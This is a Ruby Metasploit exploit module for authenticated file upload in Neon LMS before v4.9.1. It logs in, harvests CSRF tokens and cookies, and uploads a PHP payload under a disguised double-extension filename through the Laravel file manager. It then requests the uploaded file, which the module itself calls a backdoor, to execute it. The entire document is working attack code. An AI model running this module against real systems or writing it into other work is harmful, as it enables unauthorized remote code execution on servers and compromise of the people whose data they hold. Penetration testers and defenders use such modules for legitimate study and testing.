##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
    require 'msf/core'
    require "net/http"
    require "uri"
    require 'nokogiri'


    class MetasploitModule < Msf::Exploit
	Rank = ExcellentRanking

	 include Msf::Exploit::FileDropper
	 include Msf::Exploit::Remote::HttpClient
        
        

        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'Neon LMS < v4.9.1 Shell Upload ',
                'Description'    => %q{
               This module exploits File Manager File Upload 
          vulnerability found in NEON LMS. 
                },
                'Author'         => [ 'th3d1gger' ],
                
                'License'        => 'MSF_LICENSE',
	        'Platform'       => 'php',
	        'Arch' => ARCH_PHP,
	        'Targets'        =>
        	  [
	            [ 'Automatic', {} ],
	          ],
	        'DefaultTarget'  => 0 ))
            register_options(
                [
                    OptString.new('EMAIL', [ true, 'Email to login with', 'student@lms.com']),

       		   OptString.new('PASSWORD', [ true, 'Password to login with', 'secret'])

                ], self.class)
        end
	def primer
	end
        def email
    	    datastore['EMAIL']
  	end

  	def password
            datastore['PASSWORD']
  	end




        def auth

#print cookie
#print response.body
uri = URI.parse('http://'+rhost.to_s+':'+rport.to_s)
http = Net::HTTP.new(uri.host, uri.port)

# make first call to get cookies
request = Net::HTTP::Get.new(uri.request_uri)

response = http.request(request)
doc = Nokogiri::HTML(response.body)

csrf = doc.search("meta[name='csrf-token']").map { |n| 
  n['content'].to_s 
}
# save cookies
cookiexsrf = response.response['set-cookie'].split(';')
#cooke = cookiexsrf = response.response['set-cookie']

cookieneon = response.response['set-cookie'].split('/')
cookielms= cookieneon[1].split(',')[1].split(';')[0]

#print cookie
#print response.body
uri = normalize_uri('/login')
#print cookiexsrf[0]+';'+cookielms
request = Net::HTTP::Post.new(uri)
request.set_form_data({"email" => email, "password" => password, '_token'=> csrf[0]})

# Tweak headers, removing this will default to application/x-www-form-urlencoded
request["X-CSRF-TOKEN"] = csrf[0]
request['Cookie'] = cookiexsrf[0]+';'+cookielms
request['X-Requested-With'] =  'XMLHttpRequest'
request['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36' 
response = http.request(request)



    if response && response.body.include?("success")
      
      print_good("Awesome..! Authenticated with #{email}:#{password}")



doc = Nokogiri::HTML(response.body)


# save cookies
cookiexsrf = response.response['set-cookie'].split(';')
#cooke = cookiexsrf = response.response['set-cookie']

cookieneon = response.response['set-cookie'].split('/')
cookielms= cookieneon[1].split(',')[1].split(';')[0]

uri = URI.parse('http://'+rhost.to_s+':'+rport.to_s+'/user/dashboard')
http = Net::HTTP.new(uri.host, uri.port)

# make first call to get cookies
request = Net::HTTP::Get.new(uri.request_uri)
request['Cookie'] = cookiexsrf[0]+';'+cookielms
request['X-Requested-With'] =  'XMLHttpRequest'
request['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36' 
response = http.request(request)

doc = Nokogiri::HTML(response.body)

csrf = doc.search("meta[name='csrf-token']").map { |n| 
  n['content']
}


cookiexsrf = response.response['set-cookie'].split(';')
#cooke = cookiexsrf = response.response['set-cookie']

cookieneon = response.response['set-cookie'].split('/')
cookielms= cookieneon[1].split(',')[1].split(';')[0]

    
    
    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.gif.php .php"
	php = "<?php #{payload.encoded} ?>"
    	data = Rex::MIME::Message.new

    data.add_part(php, 'application/octet-stream', nil, "form-data; name=\"upload\"; filename=\"#{@fname}\"")
    post_data = data.to_s

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri('/laravel-filemanager/upload?type=&_token='+csrf[0]),
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'cookie' => cookiexsrf[0]+';'+cookielms,
      'data'     => post_data
    })
    
    if res.code == 200
    
    	print_status("backdoor uploaded")
        file = res.body.split('\'')[-2]
        file = file.split(" ")[0]    
    	print_status("#{file}")
    print_status("#{peer} - Executing #{file}...")
    uri = URI.parse(file)
http = Net::HTTP.new(uri.host, uri.port)

# make first call to get cookies
request = Net::HTTP::Get.new(uri.request_uri)

response = http.request(request)
    print_status(res.body)
    else
    	
    	print_status("failed")
    end		
    else
 #     print_status(response.body)
      fail_with(Failure::NoAccess, 'Credentials are not valid.')
    end

    
  end

       

        def exploit
	 auth

    	if auth.nil?
      	fail_with(Failure::Unknown, 'Something went wrong!')
    	end
    	end
    	end
